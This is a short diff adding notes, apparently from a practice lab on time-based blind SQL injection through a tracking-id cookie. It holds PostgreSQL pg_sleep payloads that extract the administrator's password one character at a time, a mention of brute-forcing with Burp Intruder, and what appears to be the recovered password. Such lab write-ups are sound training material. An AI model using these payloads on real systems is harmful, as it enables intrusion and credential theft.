@@ -1,0 +1,6 @@
+Manipulate tracking id
+Using ' %3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END -- ; 
+gave the desired 10s pause
+' 	%3B SELECT CASE WHEN (SUBSTRING(password,1,1) = 'v') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator' -- ;
+had the intruder with sniper do with selecting column as response recieved
+cd60n89ppkhihdnb96o8
